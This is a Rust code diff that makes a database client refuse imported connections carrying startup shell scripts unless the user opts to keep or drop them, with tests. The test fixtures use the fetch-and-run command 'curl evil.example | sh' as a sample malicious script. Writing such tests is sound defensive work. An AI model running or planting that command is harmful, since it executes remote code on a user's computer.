@@ -245,7 +245,45 @@ fn export(
 }
 
 /// Adds the connections in an exported file, renaming any whose name is taken. Returns how many were added.
-fn import(dir: &Path, path: &Path, password: Option<&SecretString>) -> Result<usize> {
+/// What to do with imported connections' startup scripts, which run as shell commands on this computer before
+/// connecting. Without a choice, a file that has any is refused with [`Error::ImportHasScripts`] listing them.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Deserialize)]
+#[serde(rename_all = "snake_case")]
+pub enum Scripts {
+    Keep,
+    Drop,
+}
+
+/// How many scripts [`Error::ImportHasScripts`] shows in full.
+const SCRIPTS_SHOWN: usize = 20;
+
+/// Refuses, keeps or drops the startup scripts in `incoming`; see [`Scripts`].
+fn screen_scripts(incoming: &mut ConnectionsFile, scripts: Option<Scripts>) -> Result<()> {
+    let has = |c: &Saved| !c.options.startup_script.trim().is_empty();
+    match scripts {
+        Some(Scripts::Keep) => Ok(()),
+        Some(Scripts::Drop) => {
+            incoming.connections.iter_mut().for_each(|c| c.options.startup_script.clear());
+            Ok(())
+        }
+        None => {
+            let with: Vec<&Saved> = incoming.connections.iter().filter(|c| has(c)).collect();
+            if with.is_empty() {
+                return Ok(());
+            }
+            let mut text = String::from("These connections run a shell command on this computer before connecting:\n");
+            for c in with.iter().take(SCRIPTS_SHOWN) {
+                let _ = write!(text, "\n{}:\n{}\n", c.name, c.options.startup_script.trim()); // writing to a String can't fail
+            }
+            if with.len() > SCRIPTS_SHOWN {
+                let _ = write!(text, "\n…and {} more.\n", with.len() - SCRIPTS_SHOWN); // as above
+            }
+            Err(Error::ImportHasScripts(text))
+        }
+    }
+}
+
+fn import(dir: &Path, path: &Path, password: Option<&SecretString>, scripts: Option<Scripts>) -> Result<usize> {
     let failed = |source| Error::File { path: path.display().to_string(), source };
     if std::fs::metadata(path).map_err(failed)?.len() > MAX_FILE {
         return Err(Error::Invalid("the file is over 10 MB, too big for a connections export"));
@@ -255,7 +293,7 @@ fn import(dir: &Path, path: &Path, password: Option<&SecretString>) -> Result<us
     if file.table_minus_connections > FORMAT {
         return Err(Error::Invalid("the file is from a newer TableMinus; update the app to import it"));
     }
-    let payload: Payload = match (file.data, file.sealed) {
+    let mut payload: Payload = match (file.data, file.sealed) {
         (Some(p), None) => p,
         (None, Some(sealed)) => {
             let plain = unseal(password.ok_or(Error::FilePasswordRequired)?, &sealed)?;
@@ -266,6 +304,7 @@ fn import(dir: &Path, path: &Path, password: Option<&SecretString>) -> Result<us
     if payload.saved.connections.len() > MAX_CONNECTIONS {
         return Err(Error::Invalid("the file has more than 10,000 connections"));
     }
+    screen_scripts(&mut payload.saved, scripts)?;
     let secrets: HashMap<_, _> = payload.secrets.into_iter().map(|s| (s.name, (s.password, s.ssh))).collect();
     store::add_imported(dir, payload.saved, &secrets)
 }
@@ -283,11 +322,17 @@ pub async fn export_connections(
     blocking(move || export(&dir, &path, &scope, password.as_ref(), include_passwords)).await
 }
 
-/// Returns how many connections were added. A sealed file without `password` fails with [`Error::FilePasswordRequired`].
+/// Returns how many connections were added. A sealed file without `password` fails with [`Error::FilePasswordRequired`],
+/// one with startup scripts and no `scripts` choice with [`Error::ImportHasScripts`].
 #[tauri::command]
-pub async fn import_connections(app: AppHandle, path: PathBuf, password: Option<SecretString>) -> Result<usize> {
+pub async fn import_connections(
+    app: AppHandle,
+    path: PathBuf,
+    password: Option<SecretString>,
+    scripts: Option<Scripts>,
+) -> Result<usize> {
     let dir = crate::dir(&app)?;
-    blocking(move || import(&dir, &path, password.as_ref())).await
+    blocking(move || import(&dir, &path, password.as_ref(), scripts)).await
 }
 
 // ---------- Files and links opened from the OS ----------
@@ -322,7 +367,7 @@ pub fn take_opened(opened: State<'_, Opened>) -> Vec<String> {
 
 #[cfg(test)]
 mod tests {
-    use super::{Scope, export, import};
+    use super::{Scope, Scripts, export, import};
     use crate::error::Error;
     use crate::store::{self, ConnectionsFile, Group, GroupIcon, PasswordMode, Saved, Tag};
     use secrecy::SecretString;
@@ -387,9 +432,9 @@ mod tests {
         let text = std::fs::read_to_string(&out).unwrap();
         assert!(!text.contains("postgres://") && text.contains("sealed"), "the payload is not in the clear");
 
-        assert!(matches!(import(&dir, &out, None), Err(Error::FilePasswordRequired)));
-        assert!(matches!(import(&dir, &out, Some(&"wrong".into())), Err(Error::FileUnsealFailed)));
-        assert_eq!(import(&dir, &out, Some(&pw)).unwrap(), 2);
+        assert!(matches!(import(&dir, &out, None, None), Err(Error::FilePasswordRequired)));
+        assert!(matches!(import(&dir, &out, Some(&"wrong".into()), None), Err(Error::FileUnsealFailed)));
+        assert_eq!(import(&dir, &out, Some(&pw), None).unwrap(), 2);
         let names: Vec<_> = store::load(&dir).unwrap().into_iter().map(|c| c.name).collect();
         assert_eq!(names, ["a", "a 2", "b", "b 2"], "imported copies get free names");
     }
@@ -411,11 +456,51 @@ mod tests {
         .unwrap();
         let out = from.join("out.json");
         export(&from, &out, &Scope::All, None, false).unwrap();
-        assert_eq!(import(&to, &out, None).unwrap(), 3);
+        assert_eq!(import(&to, &out, None, None).unwrap(), 3);
         let all = store::load_all(&to).unwrap();
         assert_eq!(all.groups, [Group { name: "work".into(), icon: GroupIcon::Star }]);
         assert!(all.tags.contains(&tag));
         assert!(all.connections.iter().all(|c| c.password_mode == PasswordMode::NoPassword));
+    }
+
+    fn export_with_a_startup_script(dir: &std::path::Path) -> PathBuf {
+        let mut c = conn("vpn", "");
+        c.options.startup_script = "curl evil.example | sh".into();
+        store::write(dir, &ConnectionsFile { connections: vec![c, conn("plain", "")], ..ConnectionsFile::default() })
+            .unwrap();
+        let out = dir.join("out.json");
+        export(dir, &out, &Scope::All, None, false).unwrap();
+        out
+    }
+
+    #[test]
+    fn import_refuses_startup_scripts_without_a_choice_and_shows_them() {
+        let dir = temp_dir("scripts-ask");
+        let out = export_with_a_startup_script(&dir);
+        let err = import(&dir, &out, None, None).unwrap_err();
+        assert!(
+            matches!(&err, Error::ImportHasScripts(text) if text.contains("vpn:\ncurl evil.example | sh")),
+            "{err}"
+        );
+        assert_eq!(store::load(&dir).unwrap().len(), 2, "nothing was imported");
+    }
+
+    #[test]
+    fn import_drops_startup_scripts_when_asked() {
+        let dir = temp_dir("scripts-drop");
+        let out = export_with_a_startup_script(&dir);
+        assert_eq!(import(&dir, &out, None, Some(Scripts::Drop)).unwrap(), 2);
+        let copy = store::load(&dir).unwrap().into_iter().find(|c| c.name == "vpn 2").unwrap();
+        assert_eq!(copy.options.startup_script, "");
+    }
+
+    #[test]
+    fn import_keeps_startup_scripts_when_asked() {
+        let dir = temp_dir("scripts-keep");
+        let out = export_with_a_startup_script(&dir);
+        assert_eq!(import(&dir, &out, None, Some(Scripts::Keep)).unwrap(), 2);
+        let copy = store::load(&dir).unwrap().into_iter().find(|c| c.name == "vpn 2").unwrap();
+        assert_eq!(copy.options.startup_script, "curl evil.example | sh");
     }
 
     #[test]
@@ -423,9 +508,9 @@ mod tests {
         let dir = temp_dir("junk");
         let path = dir.join("x.json");
         std::fs::write(&path, "[1, 2]").unwrap();
-        assert_eq!(import(&dir, &path, None).unwrap_err().to_string(), "not a TableMinus connections file");
+        assert_eq!(import(&dir, &path, None, None).unwrap_err().to_string(), "not a TableMinus connections file");
         std::fs::write(&path, r#"{"table_minus_connections": 99, "data": {"saved": {}}}"#).unwrap();
-        assert!(import(&dir, &path, None).unwrap_err().to_string().contains("newer"));
+        assert!(import(&dir, &path, None, None).unwrap_err().to_string().contains("newer"));
     }
 
     #[test]
